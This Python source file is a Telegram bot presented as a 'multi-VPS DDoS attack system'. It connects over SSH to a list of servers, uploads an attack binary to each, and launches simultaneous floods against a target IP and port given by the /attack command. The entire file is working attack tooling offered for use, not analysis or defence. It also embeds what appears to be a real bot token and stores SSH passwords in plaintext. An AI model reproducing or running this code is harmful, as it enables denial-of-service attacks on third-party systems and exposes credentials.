import os
import time
import asyncio
import json
import paramiko
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from datetime import datetime
import threading

# ==================== CONFIG ====================
TELEGRAM_TOKEN = "8739965850:AAH9omZ01ouCVw5TEmhrahUxD3wT1BsqprY"
ADMIN_ID = 8179218740  # YOUR ADMIN ID HERE
VPS_FILE = "vps_servers.json"
MAX_ATTACK_TIME = 300  # 5 minutes max

# Global variables
vps_servers = []
is_attack_running = False
current_attack_id = None
user_sessions = {}  # Store temporary data for multi-step inputs

# ==================== LOAD/SAVE VPS ====================
def load_vps():
    global vps_servers
    if os.path.exists(VPS_FILE):
        try:
            with open(VPS_FILE, 'r') as f:
                vps_servers = json.load(f)
        except:
            vps_servers = []
    return vps_servers

def save_vps():
    with open(VPS_FILE, 'w') as f:
        json.dump(vps_servers, f)

# Initial load
load_vps()

# ==================== BANNER ====================
BANNER = """
╔══════════════════════════════════════════════════╗
║     🔥 MULTI-VPS DDOS ATTACK SYSTEM v2.0 🔥      ║
║     ⚡ Attack from ALL VPS simultaneously ⚡      ║
║     👑 Owner: @SIDIKI_MUSTAFA_92 👑              ║
╚══════════════════════════════════════════════════╝
"""

# Colors for terminal
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
R = '\033[0m'

# ==================== COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    text = f"""
{BANNER}

📋 **AVAILABLE COMMANDS:**

🔐 **VPS MANAGEMENT:**
/add_vps - Add new VPS (via interactive buttons)
/remove_vps <ip> - Remove VPS
/list_vps - List all VPS servers
/test_vps - Test connection to all VPS

⚡ **ATTACK COMMANDS:**
/attack <ip> <port> <time> - Start attack from ALL VPS
/stop_attack - Stop current attack
/attack_status - Check attack status

📊 **SYSTEM STATS:**
/stats - Show system statistics
/upload - Upload mustafa binary to all VPS
/help - Show this help

🔥 **Total VPS: {len(vps_servers)}**
✅ **Ready for massive attack!**
    """
    
    # Create keyboard for quick actions
    keyboard = [
        [InlineKeyboardButton("➕ Add VPS", callback_data="add_vps_menu")],
        [InlineKeyboardButton("📋 List VPS", callback_data="list_vps"), 
         InlineKeyboardButton("📊 Stats", callback_data="show_stats")],
        [InlineKeyboardButton("✅ Test VPS", callback_data="test_vps"), 
         InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)

async def add_vps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start add VPS process with buttons"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    keyboard = [
        [InlineKeyboardButton("🖥️ Direct VPS (Password)", callback_data="add_direct_vps")],
        [InlineKeyboardButton("☁️ AWS VPS (PEM File)", callback_data="add_aws_vps")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔐 **SELECT VPS TYPE:**\n\n"
        "🖥️ **Direct VPS** - Normal VPS with password\n"
        "☁️ **AWS VPS** - AWS EC2 with .pem file\n\n"
        "Choose option:",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def remove_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove VPS server"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("❌ Usage: `/remove_vps <ip>`", parse_mode="Markdown")
        return
    
    ip = context.args[0]
    
    for i, vps in enumerate(vps_servers):
        if vps['ip'] == ip:
            # Delete pem file if exists
            if vps.get('pem_path') and os.path.exists(vps['pem_path']):
                os.remove(vps['pem_path'])
            removed = vps_servers.pop(i)
            save_vps()
            await update.message.reply_text(
                f"✅ **VPS REMOVED**\n\n"
                f"🌍 IP: `{ip}`\n"
                f"🔐 Auth: `{removed.get('auth_type', 'password')}`\n"
                f"📊 Remaining: `{len(vps_servers)}`",
                parse_mode="Markdown"
            )
            return
    
    await update.message.reply_text(f"❌ VPS {ip} not found!")

async def list_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all VPS servers"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers added!")
        return
    
    text = "📋 **VPS SERVERS LIST**\n\n"
    
    for i, vps in enumerate(vps_servers, 1):
        status_emoji = "✅" if vps.get('status') == 'active' else "❌"
        auth_emoji = "🔐" if vps.get('auth_type') == 'password' else "🔑"
        
        text += f"{status_emoji} **VPS #{i}**\n"
        text += f"   🌍 IP: `{vps['ip']}`\n"
        text += f"   🔌 Port: `{vps['port']}`\n"
        text += f"   👤 User: `{vps['username']}`\n"
        text += f"   {auth_emoji} Auth: `{vps.get('auth_type', 'password')}`\n"
        
        if vps.get('auth_type') == 'pem':
            text += f"   📁 PEM: `{os.path.basename(vps.get('pem_path', 'N/A'))}`\n"
        
        text += f"   ⚡ Attacks: `{vps.get('attack_count', 0)}`\n"
        text += f"   📅 Added: `{datetime.fromtimestamp(vps.get('added_at', 0)).strftime('%Y-%m-%d')}`\n\n"
    
    text += f"📊 **TOTAL VPS: {len(vps_servers)}**"
    
    await update.message.reply_text(text, parse_mode="Markdown")

async def test_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test all VPS connections"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers to test!")
        return
    
    msg = await update.message.reply_text("🔄 Testing all VPS connections...")
    
    results = []
    active_count = 0
    
    for vps in vps_servers:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect based on auth type
            if vps.get('auth_type') == 'pem':
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    key_filename=vps['pem_path'],
                    timeout=5
                )
            else:
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    password=vps.get('password', ''),
                    timeout=5
                )
            
            # Test if mustafa exists
            stdin, stdout, stderr = client.exec_command("ls -la mustafa 2>/dev/null && echo 'EXISTS' || echo 'NOTFOUND'")
            output = stdout.read().decode().strip()
            
            client.close()
            
            if 'EXISTS' in output:
                results.append(f"✅ {vps['ip']}: Connected & mustafa found")
                vps['status'] = 'active'
                active_count += 1
            else:
                results.append(f"⚠️ {vps['ip']}: Connected but mustafa not found")
                vps['status'] = 'no_binary'
                
        except Exception as e:
            results.append(f"❌ {vps['ip']}: Failed - {str(e)[:50]}")
            vps['status'] = 'dead'
    
    save_vps()
    
    result_text = "📊 **VPS TEST RESULTS**\n\n"
    result_text += "\n".join(results[:10])  # Show first 10
    if len(results) > 10:
        result_text += f"\n... and {len(results)-10} more"
    result_text += f"\n\n✅ Active: {active_count}/{len(vps_servers)}"
    
    await msg.edit_text(result_text, parse_mode="Markdown")

async def attack_vps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Launch attack from ALL VPS simultaneously"""
    global is_attack_running, current_attack_id
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if is_attack_running:
        await update.message.reply_text("❌ Attack already running! Use /stop_attack first.")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text(
            "❌ **Usage:** `/attack <target_ip> <port> <time>`\n\n"
            "📝 **Example:**\n"
            "`/attack 192.168.1.200 80 60`",
            parse_mode="Markdown"
        )
        return
    
    target_ip, port, duration = context.args
    
    try:
        duration = int(duration)
        if duration > MAX_ATTACK_TIME:
            await update.message.reply_text(f"❌ Max attack time is {MAX_ATTACK_TIME} seconds!")
            return
    except:
        await update.message.reply_text("❌ Invalid time!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers added!")
        return
    
    # Filter active VPS
    active_vps = [vps for vps in vps_servers if vps.get('status') == 'active']
    
    if not active_vps:
        await update.message.reply_text("❌ No active VPS! Run /test_vps first.")
        return
    
    msg = await update.message.reply_text(
        f"🚀 **LAUNCHING MASSIVE ATTACK!**\n\n"
        f"🎯 Target: `{target_ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🖥️ VPS Count: `{len(active_vps)}`\n"
        f"⚡ Status: Starting attack...",
        parse_mode="Markdown"
    )
    
    is_attack_running = True
    current_attack_id = str(int(time.time()))
    
    # Launch attack in background
    asyncio.create_task(run_massive_attack(update, context, active_vps, target_ip, port, duration, msg))

async def run_massive_attack(update, context, vps_list, target_ip, port, duration, msg):
    """Run attack on all VPS simultaneously"""
    global is_attack_running
    
    successful = 0
    failed = 0
    results = []
    
    # Function to attack single VPS
    def attack_single_vps(vps):
        nonlocal successful, failed
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect based on auth type
            if vps.get('auth_type') == 'pem':
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    key_filename=vps['pem_path'],
                    timeout=10
                )
            else:
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    password=vps.get('password', ''),
                    timeout=10
                )
            
            # Kill existing mustafa processes
            client.exec_command("pkill -f mustafa")
            time.sleep(1)
            
            # Start new attack in background
            command = f"cd ~ && nohup ./mustafa {target_ip} {port} {duration} 51 2000 > /dev/null 2>&1 &"
            stdin, stdout, stderr = client.exec_command(command)
            
            client.close()
            
            vps['attack_count'] = vps.get('attack_count', 0) + 1
            vps['last_used'] = time.time()
            successful += 1
            results.append(f"✅ {vps['ip']}: Attack started")
            
        except Exception as e:
            failed += 1
            results.append(f"❌ {vps['ip']}: {str(e)[:30]}")
    
    # Update message
    await msg.edit_text(
        f"🚀 **ATTACK IN PROGRESS**\n\n"
        f"🎯 Target: `{target_ip}:{port}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🖥️ Launching on {len(vps_list)} VPS...\n"
        f"⚡ Please wait...",
        parse_mode="Markdown"
    )
    
    # Launch threads for parallel attacks
    threads = []
    for vps in vps_list:
        thread = threading.Thread(target=attack_single_vps, args=(vps,))
        thread.start()
        threads.append(thread)
        time.sleep(0.5)  # Small delay to avoid overwhelming
    
    # Wait for all to start
    for thread in threads:
        thread.join()
    
    save_vps()
    
    # Show results
    result_text = f"✅ **ATTACK LAUNCHED SUCCESSFULLY!**\n\n"
    result_text += f"🎯 Target: `{target_ip}:{port}`\n"
    result_text += f"⏱️ Duration: `{duration}s`\n"
    result_text += f"🖥️ VPS Total: `{len(vps_list)}`\n"
    result_text += f"✅ Successful: `{successful}`\n"
    result_text += f"❌ Failed: `{failed}`\n\n"
    
    # Show first 5 results
    result_text += "📋 **Details:**\n"
    for res in results[:5]:
        result_text += f"{res}\n"
    
    if len(results) > 5:
        result_text += f"... and {len(results)-5} more\n"
    
    result_text += f"\n⏱️ Attack will run for {duration} seconds..."
    
    await msg.edit_text(result_text, parse_mode="Markdown")
    
    # Wait for attack duration
    await asyncio.sleep(duration)
    
    # Attack finished
    is_attack_running = False
    
    await context.bot.send_message(
        chat_id=update.effective_user.id,
        text=f"✅ **ATTACK COMPLETED!**\n\n"
             f"🎯 Target: `{target_ip}:{port}`\n"
             f"⏱️ Duration: `{duration}s`\n"
             f"🖥️ VPS Used: `{successful}`\n"
             f"⚡ Attack finished successfully!",
        parse_mode="Markdown"
    )

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current attack"""
    global is_attack_running
    
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if not is_attack_running:
        await update.message.reply_text("❌ No attack running!")
        return
    
    msg = await update.message.reply_text("🛑 Stopping attack on all VPS...")
    
    stopped = 0
    failed = 0
    
    for vps in vps_servers:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect based on auth type
            if vps.get('auth_type') == 'pem':
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    key_filename=vps['pem_path'],
                    timeout=5
                )
            else:
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    password=vps.get('password', ''),
                    timeout=5
                )
            
            client.exec_command("pkill -f mustafa")
            client.close()
            stopped += 1
            
        except:
            failed += 1
    
    is_attack_running = False
    
    await msg.edit_text(
        f"🛑 **ATTACK STOPPED**\n\n"
        f"✅ Stopped: `{stopped}` VPS\n"
        f"❌ Failed: `{failed}` VPS\n"
        f"⚡ System ready for next attack!",
        parse_mode="Markdown"
    )

async def attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check attack status"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    status = "🟢 READY" if not is_attack_running else "🔴 ATTACK RUNNING"
    
    active_vps = sum(1 for v in vps_servers if v.get('status') == 'active')
    total_vps = len(vps_servers)
    
    await update.message.reply_text(
        f"📊 **ATTACK STATUS**\n\n"
        f"⚡ Status: `{status}`\n"
        f"🖥️ Active VPS: `{active_vps}/{total_vps}`\n"
        f"🎯 Attack ID: `{current_attack_id if is_attack_running else 'None'}`\n\n"
        f"Use /stop_attack to stop current attack",
        parse_mode="Markdown"
    )

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show system statistics"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    active_vps = sum(1 for v in vps_servers if v.get('status') == 'active')
    dead_vps = sum(1 for v in vps_servers if v.get('status') == 'dead')
    no_binary = sum(1 for v in vps_servers if v.get('status') == 'no_binary')
    
    password_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'password')
    pem_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'pem')
    
    total_attacks = sum(v.get('attack_count', 0) for v in vps_servers)
    
    await update.message.reply_text(
        f"📊 **SYSTEM STATISTICS**\n\n"
        f"🖥️ **VPS Status:**\n"
        f"• Total VPS: `{len(vps_servers)}`\n"
        f"• ✅ Active: `{active_vps}`\n"
        f"• ⚠️ No Binary: `{no_binary}`\n"
        f"• ❌ Dead: `{dead_vps}`\n\n"
        f"🔐 **Auth Types:**\n"
        f"• Password: `{password_vps}`\n"
        f"• PEM File: `{pem_vps}`\n\n"
        f"⚡ **Attack Stats:**\n"
        f"• Total Attacks: `{total_attacks}`\n"
        f"• Attack Running: `{'Yes' if is_attack_running else 'No'}`\n\n"
        f"🔧 **Configuration:**\n"
        f"• Max Attack Time: `{MAX_ATTACK_TIME}s`",
        parse_mode="Markdown"
    )

async def upload_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Upload mustafa binary to all VPS"""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if not vps_servers:
        await update.message.reply_text("❌ No VPS servers!")
        return
    
    # Check if file exists locally
    if not os.path.exists("mustafa"):
        await update.message.reply_text("❌ mustafa binary not found in current directory!")
        return
    
    msg = await update.message.reply_text("📤 Uploading binary to all VPS...")
    
    successful = 0
    failed = 0
    
    for vps in vps_servers:
        try:
            # Use paramiko SFTP to upload
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect based on auth type
            if vps.get('auth_type') == 'pem':
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    key_filename=vps['pem_path'],
                    timeout=10
                )
            else:
                client.connect(
                    vps['ip'], 
                    port=vps['port'], 
                    username=vps['username'], 
                    password=vps.get('password', ''),
                    timeout=10
                )
            
            sftp = client.open_sftp()
            sftp.put("mustafa", "mustafa")
            sftp.close()
            
            # Make executable
            client.exec_command("chmod +x mustafa")
            client.close()
            
            vps['status'] = 'active'
            successful += 1
            
        except Exception as e:
            failed += 1
            vps['status'] = 'dead'
    
    save_vps()
    
    await msg.edit_text(
        f"📤 **BINARY UPLOAD COMPLETE**\n\n"
        f"✅ Successful: `{successful}`\n"
        f"❌ Failed: `{failed}`\n"
        f"🖥️ Total VPS: `{len(vps_servers)}`",
        parse_mode="Markdown"
    )

# ==================== CALLBACK HANDLERS ====================
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button presses"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        await query.edit_message_text("❌ Admin only!")
        return
    
    data = query.data
    
    if data == "add_vps_menu":
        keyboard = [
            [InlineKeyboardButton("🖥️ Direct VPS (Password)", callback_data="add_direct_vps")],
            [InlineKeyboardButton("☁️ AWS VPS (PEM File)", callback_data="add_aws_vps")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "🔐 **SELECT VPS TYPE:**",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )
    
    elif data == "add_direct_vps":
        # Start direct VPS addition flow
        user_sessions[user_id] = {'type': 'direct', 'step': 'ip'}
        await query.edit_message_text(
            "📝 **ADD DIRECT VPS**\n\n"
            "Step 1/4: Enter VPS IP Address:\n"
            "Example: `192.168.1.100`",
            parse_mode="Markdown"
        )
    
    elif data == "add_aws_vps":
        # Start AWS VPS addition flow
        user_sessions[user_id] = {'type': 'aws', 'step': 'ip'}
        await query.edit_message_text(
            "📝 **ADD AWS VPS**\n\n"
            "Step 1/4: Enter VPS IP Address:\n"
            "Example: `54.123.45.67`",
            parse_mode="Markdown"
        )
    
    elif data == "list_vps":
        if not vps_servers:
            await query.edit_message_text("❌ No VPS servers added!")
            return
        
        text = "📋 **VPS SERVERS LIST**\n\n"
        
        for i, vps in enumerate(vps_servers, 1):
            status_emoji = "✅" if vps.get('status') == 'active' else "❌"
            auth_emoji = "🔐" if vps.get('auth_type') == 'password' else "🔑"
            
            text += f"{status_emoji} **VPS #{i}**\n"
            text += f"   🌍 IP: `{vps['ip']}`\n"
            text += f"   🔌 Port: `{vps['port']}`\n"
            text += f"   👤 User: `{vps['username']}`\n"
            text += f"   {auth_emoji} Auth: `{vps.get('auth_type', 'password')}`\n"
            text += f"   ⚡ Attacks: `{vps.get('attack_count', 0)}`\n\n"
        
        text += f"📊 **TOTAL VPS: {len(vps_servers)}**"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data == "show_stats":
        active_vps = sum(1 for v in vps_servers if v.get('status') == 'active')
        dead_vps = sum(1 for v in vps_servers if v.get('status') == 'dead')
        no_binary = sum(1 for v in vps_servers if v.get('status') == 'no_binary')
        
        password_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'password')
        pem_vps = sum(1 for v in vps_servers if v.get('auth_type') == 'pem')
        
        total_attacks = sum(v.get('attack_count', 0) for v in vps_servers)
        
        text = f"""
📊 **SYSTEM STATISTICS**

🖥️ **VPS Status:**
• Total VPS: `{len(vps_servers)}`
• ✅ Active: `{active_vps}`
• ⚠️ No Binary: `{no_binary}`
• ❌ Dead: `{dead_vps}`

🔐 **Auth Types:**
• Password: `{password_vps}`
• PEM File: `{pem_vps}`

⚡ **Attack Stats:**
• Total Attacks: `{total_attacks}`
• Attack Running: `{'Yes' if is_attack_running else 'No'}`

🔧 **Configuration:**
• Max Attack Time: `{MAX_ATTACK_TIME}s`
        """
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data == "test_vps":
        if not vps_servers:
            await query.edit_message_text("❌ No VPS servers to test!")
            return
        
        await query.edit_message_text("🔄 Testing all VPS connections...")
        
        results = []
        active_count = 0
        
        for vps in vps_servers:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                if vps.get('auth_type') == 'pem':
                    client.connect(
                        vps['ip'], 
                        port=vps['port'], 
                        username=vps['username'], 
                        key_filename=vps['pem_path'],
                        timeout=5
                    )
                else:
                    client.connect(
                        vps['ip'], 
                        port=vps['port'], 
                        username=vps['username'], 
                        password=vps.get('password', ''),
                        timeout=5
                    )
                
                stdin, stdout, stderr = client.exec_command("ls -la mustafa 2>/dev/null && echo 'EXISTS' || echo 'NOTFOUND'")
                output = stdout.read().decode().strip()
                
                client.close()
                
                if 'EXISTS' in output:
                    results.append(f"✅ {vps['ip']}: Connected & mustafa found")
                    vps['status'] = 'active'
                    active_count += 1
                else:
                    results.append(f"⚠️ {vps['ip']}: Connected but mustafa not found")
                    vps['status'] = 'no_binary'
                    
            except Exception as e:
                results.append(f"❌ {vps['ip']}: Failed - {str(e)[:50]}")
                vps['status'] = 'dead'
        
        save_vps()
        
        result_text = "📊 **VPS TEST RESULTS**\n\n"
        result_text += "\n".join(results[:10])
        if len(results) > 10:
            result_text += f"\n... and {len(results)-10} more"
        result_text += f"\n\n✅ Active: {active_count}/{len(vps_servers)}"
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(result_text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data == "upload_binary":
        if not vps_servers:
            await query.edit_message_text("❌ No VPS servers!")
            return
        
        if not os.path.exists("mustafa"):
            await query.edit_message_text("❌ mustafa binary not found in current directory!")
            return
        
        await query.edit_message_text("📤 Uploading binary to all VPS...")
        
        successful = 0
        failed = 0
        
        for vps in vps_servers:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                if vps.get('auth_type') == 'pem':
                    client.connect(
                        vps['ip'], 
                        port=vps['port'], 
                        username=vps['username'], 
                        key_filename=vps['pem_path'],
                        timeout=10
                    )
                else:
                    client.connect(
                        vps['ip'], 
                        port=vps['port'], 
                        username=vps['username'], 
                        password=vps.get('password', ''),
                        timeout=10
                    )
                
                sftp = client.open_sftp()
                sftp.put("mustafa", "mustafa")
                sftp.close()
                
                client.exec_command("chmod +x mustafa")
                client.close()
                
                vps['status'] = 'active'
                successful += 1
                
            except Exception as e:
                failed += 1
                vps['status'] = 'dead'
        
        save_vps()
        
        text = f"""
📤 **BINARY UPLOAD COMPLETE**

✅ Successful: `{successful}`
❌ Failed: `{failed}`
🖥️ Total VPS: `{len(vps_servers)}`
        """
        
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_main")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=reply_markup)
    
    elif data == "back_to_main":
        keyboard = [
            [InlineKeyboardButton("➕ Add VPS", callback_data="add_vps_menu")],
            [InlineKeyboardButton("📋 List VPS", callback_data="list_vps"), 
             InlineKeyboardButton("📊 Stats", callback_data="show_stats")],
            [InlineKeyboardButton("✅ Test VPS", callback_data="test_vps"), 
             InlineKeyboardButton("📤 Upload Binary", callback_data="upload_binary")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"{BANNER}\n\n📋 **MAIN MENU**\nChoose an option:",
            parse_mode="Markdown",
            reply_markup=reply_markup
        )

# ==================== MESSAGE HANDLERS ====================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages for multi-step input"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        return
    
    if user_id not in user_sessions:
        return
    
    session = user_sessions[user_id]
    text = update.message.text
    
    if session['type'] == 'direct':
        if session['step'] == 'ip':
            session['ip'] = text
            session['step'] = 'port'
            await update.message.reply_text(
                "✅ IP saved!\n\n"
                "Step 2/4: Enter SSH Port:\n"
                "Example: `22`"
            )
        
        elif session['step'] == 'port':
            try:
                session['port'] = int(text)
                session['step'] = 'username'
                await update.message.reply_text(
                    "✅ Port saved!\n\n"
                    "Step 3/4: Enter Username:\n"
                    "Example: `root` or `ubuntu`"
                )
            except:
                await update.message.reply_text("❌ Invalid port! Enter number:")
        
        elif session['step'] == 'username':
            session['username'] = text
            session['step'] = 'password'
            await update.message.reply_text(
                "✅ Username saved!\n\n"
                "Step 4/4: Enter Password:"
            )
        
        elif session['step'] == 'password':
            session['password'] = text
            
            # Test connection and save
            msg = await update.message.reply_text("🔌 Testing connection...")
            
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    session['ip'], 
                    port=session['port'], 
                    username=session['username'], 
                    password=session['password'], 
                    timeout=10
                )
                client.close()
                
                # Add to list
                vps_servers.append({
                    'ip': session['ip'],
                    'port': session['port'],
                    'username': session['username'],
                    'auth_type': 'password',
                    'password': session['password'],
                    'pem_path': None,
                    'status': 'active',
                    'added_at': time.time(),
                    'last_used': None,
                    'attack_count': 0
                })
                save_vps()
                
                await msg.edit_text(
                    f"✅ **VPS ADDED SUCCESSFULLY!**\n\n"
                    f"🌍 IP: `{session['ip']}`\n"
                    f"🔌 Port: `{session['port']}`\n"
                    f"👤 Username: `{session['username']}`\n"
                    f"🔐 Auth: Password\n"
                    f"📊 Total VPS: `{len(vps_servers)}`",
                    parse_mode="Markdown"
                )
                
                # Clear session
                del user_sessions[user_id]
                
            except Exception as e:
                await msg.edit_text(f"❌ Connection failed: {str(e)}")
    
    elif session['type'] == 'aws':
        if session['step'] == 'ip':
            session['ip'] = text
            session['step'] = 'port'
            await update.message.reply_text(
                "✅ IP saved!\n\n"
                "Step 2/4: Enter SSH Port:\n"
                "Example: `22`"
            )
        
        elif session['step'] == 'port':
            try:
                session['port'] = int(text)
                session['step'] = 'username'
                await update.message.reply_text(
                    "✅ Port saved!\n\n"
                    "Step 3/4: Enter Username:\n"
                    "Example: `ubuntu` or `ec2-user`"
                )
            except:
                await update.message.reply_text("❌ Invalid port! Enter number:")
        
        elif session['step'] == 'username':
            session['username'] = text
            session['step'] = 'pem_path'
            await update.message.reply_text(
                "✅ Username saved!\n\n"
                "Step 4/4: **Send the .pem file**\n\n"
                "📎 Please upload your .pem file as a document.",
                parse_mode="Markdown"
            )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document upload for PEM files"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        return
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Please start with /add_vps first!")
        return
    
    session = user_sessions[user_id]
    
    if session['type'] == 'aws' and session['step'] == 'pem_path':
        document = update.message.document
        
        # Check if it's a PEM file
        if not document.file_name.endswith('.pem'):
            await update.message.reply_text("❌ Please upload a .pem file!")
            return
        
        # Download the file
        file = await context.bot.get_file(document.file_id)
        
        # Create pem directory if not exists
        if not os.path.exists('pem_files'):
            os.makedirs('pem_files')
        
        # Save with IP-based name
        pem_path = f"pem_files/{session['ip']}.pem"
        await file.download_to_drive(pem_path)
        
        # Set proper permissions
        os.chmod(pem_path, 0o400)
        
        # Test connection
        msg = await update.message.reply_text("🔌 Testing connection with PEM...")
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                session['ip'], 
                port=session['port'], 
                username=session['username'], 
                key_filename=pem_path,
                timeout=10
            )
            client.close()
            
            # Add to list
            vps_servers.append({
                'ip': session['ip'],
                'port': session['port'],
                'username': session['username'],
                'auth_type': 'pem',
                'password': None,
                'pem_path': pem_path,
                'status': 'active',
                'added_at': time.time(),
                'last_used': None,
                'attack_count': 0
            })
            save_vps()
            
            await msg.edit_text(
                f"✅ **AWS VPS ADDED SUCCESSFULLY!**\n\n"
                f"🌍 IP: `{session['ip']}`\n"
                f"🔌 Port: `{session['port']}`\n"
                f"👤 Username: `{session['username']}`\n"
                f"🔐 Auth: PEM File\n"
                f"📁 PEM: `{pem_path}`\n"
                f"📊 Total VPS: `{len(vps_servers)}`",
                parse_mode="Markdown"
            )
            
            # Clear session
            del user_sessions[user_id]
            
        except Exception as e:
            await msg.edit_text(f"❌ Connection failed: {str(e)}")
            # Delete invalid pem file
            if os.path.exists(pem_path):
                os.remove(pem_path)

# ==================== MAIN ====================
def main():
    print(BANNER)
    print(f"{G}✅ Loading VPS: {len(vps_servers)} servers found")
    print(f"{C}✅ Bot starting...")
    
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("add_vps", add_vps_command))
    app.add_handler(CommandHandler("remove_vps", remove_vps))
    app.add_handler(CommandHandler("list_vps", list_vps))
    app.add_handler(CommandHandler("test_vps", test_vps))
    app.add_handler(CommandHandler("attack", attack_vps))
    app.add_handler(CommandHandler("stop_attack", stop_attack))
    app.add_handler(CommandHandler("attack_status", attack_status))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("upload", upload_binary))
    app.add_handler(CommandHandler("help", start))
    
    # Callback handler for buttons
    app.add_handler(CallbackQueryHandler(button_callback))
    
    # Message handlers for multi-step input
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print(f"{G}✅ Bot is running!")
    print(f"{Y}👑 Admin ID: {ADMIN_ID}")
    print(f"{C}📊 VPS Count: {len(vps_servers)}")
    
    app.run_polling()

